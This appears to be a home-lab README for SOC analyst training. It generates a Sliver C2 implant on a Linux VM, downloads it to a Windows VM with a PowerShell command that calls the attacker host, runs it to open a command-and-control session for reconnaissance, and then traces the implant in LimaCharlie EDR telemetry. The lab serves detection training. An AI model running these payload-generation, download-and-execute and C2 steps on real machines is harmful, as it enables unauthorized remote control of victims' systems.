<h1>Generating a C2 Payload<h/1>


<h2>Description</h2>
This project demonstrates how to generate a C2 Payload. A C2 Payload is one of the most damaging attacks, often executed over DNS, is accomplished through command and control.
Then we will start a Command and Control session and finally observe EDR Telemetry on Lima Charlie.
<br />


<h2>Environments Used </h2>

- <b>VMware Fusion</b>
- <b>Linux Server 22.04.2</b>
- <b>Windows 11</b>
- <b>Lima Charlie</b>

<h2>Program walk-through:</h2>

<!-- <p align="center"> --!>
1 - To generate a C2 Payload run > sudo su > cd /opt/sliver > sliver-server > generate --http [Linux_VM_IP] --save /opt/sliver (edit your linux ip) > implants > exit <br/>
<img width="900" alt="1" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/7743301d-b09a-4ed0-8c1a-ea63ee91e98f">
<br />
2	- To easily download the C2 Payload from the Linux Server to the Windows 11 VM simply run > cd /opt/sliver > python3 -m http.server 80 <br/>
<img width="900" alt="2" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/097e21bf-3fec-4517-bb50-c71494b8536d">
<br />
3	- Start up your Windows 11 VM and search for PowerShell on the search bar then click Run as Administrator. <br/>
<img width="900" alt="3" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/1d8c13f7-0d20-488c-ab07-2df52afa4cfa">
<br />
4 - To download the C2 Payload run the following command (editing both the Linux IP and name of the payload you generated) > IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe <br/>
<img width="900" alt="4" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/041c318e-8d15-4e45-abca-1f2c39646ed4">
<br />
5 - Take a snapshot of the Windows 11 VM by opening Virtual Machine Library > Right click on the Windows 11 VM and select Snapshots... > click the camera logo on the top bar and name it "Malware staged" > then click take.  <br/>
<img width="900" alt="5" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/1046fd84-5237-4222-8972-e9bf67949b88">
<br />
6 - Let's start a Command and Control session. Back on your ssh client run > sliver-server > http <br/>
<img width="900" alt="6" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/76d9f163-8e5a-4055-85ea-34ad76681d1c">
<br />
7 - On your Windows 11 VM in PowerShell run > cd C:\Users\User\Downloads\ > dir > .\<your_C2-implant>.exe (edit your payload name you generated). <br/>
<img width="900" alt="7" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/d78626a1-a49d-4148-877d-f4e6d4df8890">
<br />
8 - Back on your ssh client run > sessions (and take note of session id number). <br/>
<img width="900" alt="8" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/2aa2d75c-60cb-4cd8-ad80-51e42e809662">
<br />
9 - To interact with your new C2 session run > use [session_id] - You are now interacting directly with the C2 session on the Windows VM run > info (to get more details about the C2 payload). <br/>  
<img width="900" alt="9" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/2b89968f-9e02-4b61-b891-cf09238ab557">
<br />
10 - To find out what user your implant is running as, run > whoami > getprivs <br>
<img width="900" alt="10" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/620554a2-4098-4265-92cd-1c0313dd5864">
<br />
11 - To identify your implant’s working directory run > pwd - To examine network connections occurring on the remote system run > netstat (notice that Sliver cleverly highlights its own process in green). <br/>
<img width="900" alt="11" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/15e06eec-ab39-444c-ae7e-79059830a059">
<br />
12 - To identify running processes on the remote system run > ps -T (notice that Sliver cleverly highlights its own process in green and any detected countermeasures (defensive tools) in red) <br/>
<img width="900" alt="12" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/093c2adc-d2d0-42f2-9051-cbb47a248d32">
<img width="900" alt="13" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/ab9b73dd-ff76-4120-b6aa-fba0df96e18d">
<br />
13 - Log into your Lima Charlie dashboard on the web browser. Select Sensors on left menu then select your active Windows sensor. <br/>
<img width="900" alt="14" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/27bb18b8-5729-46fa-ab87-520a5c488f6a">
<br />
14 - On the new left-side menu for this sensor, select Processes.  <br/>
<img width="900" alt="15" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/79e1fdf7-d3fb-4ffc-91a4-5a2d6e158cec">
<br />
15 - Take sometime going through some of these processes. A process carrying a valid signature (Signed) is often (almost always) going to be not harmful. But some signed processes can be used to launch malicious processes/code. One of the easiest ways to spot unusual processes is to simply look for ones that are NOT signed. <br/>
<img width="900" alt="16" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/0dd25ef8-37d8-47d1-8956-b2c7c53c0053">
<br />
16 - You can find your C2 Payload by searching in the filter box. Hover over your C2 Payload and click on View Network Connections to see the source and destination IP.  <br/>
<img width="900" alt="17" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/10aefc86-9614-49a9-b127-8992cb673d8a">
<br />
17 - Select the Network tab on the left-side menu.Take some time exploring the IP address that it returned. <br>
<img width="900" alt="18" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/45bb7f11-7e33-4712-955d-7c0bacd37889">
<br />
18 - Select the File System tab on the left-side menu. Browse to C:\Users\User\Downloads. Hover over your C2 Payload and select the hash (#). <br/>
<img width="900" alt="19" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/891235a2-ac2e-4d75-9fc1-2655ab81f58c">
<br />
19 - Then select Search hash with VirusTotal.<br/>
<img width="900" alt="20" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/a507ad55-b7e6-47fa-a676-9821a5263ca6">
<br />
20 - If the result you get is (Item not found) on VirusTotal this does not mean that this file is safe, just that it’s never been seen before by VirusTotal. <br/> 
<img width="900" alt="21" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/68b683a5-dc07-47f7-b772-d37c3b87d5c2">
<br />
21 - Select Timeline on the left-side menu of our sensor. Practice filtering your timeline with known IOCs (indicators of compromise) such as the name of your implant or the known C2 IP address. <br/>
<img width="900" alt="22" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/75f11113-3163-4cc0-9cbc-17da422542ef">
<br />
22 - Search for your C2 Payload in the filter. If you scroll back far enough, should be able to find the moment your implant was created on the system, and when it was launched shortly after, and the network connections it created immediately after. <br/>
<img width="900" alt="23" src="https://github.com/A0005/SOC-Analyst-Lab/assets/103763124/067d5bb4-0bdd-4d1b-92a1-66d2ab62ff37">
</p>



<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
